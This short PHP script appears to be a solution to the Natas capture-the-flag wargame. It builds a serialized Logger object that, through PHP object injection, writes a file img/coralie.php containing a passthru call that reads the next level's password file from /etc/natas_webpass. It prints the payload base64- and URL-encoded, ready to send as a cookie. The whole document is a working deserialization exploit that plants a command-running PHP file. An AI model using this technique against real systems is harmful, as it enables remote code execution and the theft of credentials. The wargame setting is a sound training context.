<?php

class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg=" <?php passthru('cat /etc/natas_webpass/natas27'); ?>\n\n";
            $this->exitMsg=" <?php passthru('cat /etc/natas_webpass/natas27'    ); ?>\n";
            $this->logFile = "img/coralie.php";
        }

        function log($msg){
            ;
        }

        function __destruct(){
            ;
        }
    }


$obj = new Logger("hello");

echo serialize($obj);
echo "\nbase64_encoded:\n\n";
echo urlencode(base64_encode(serialize($obj)));

?>
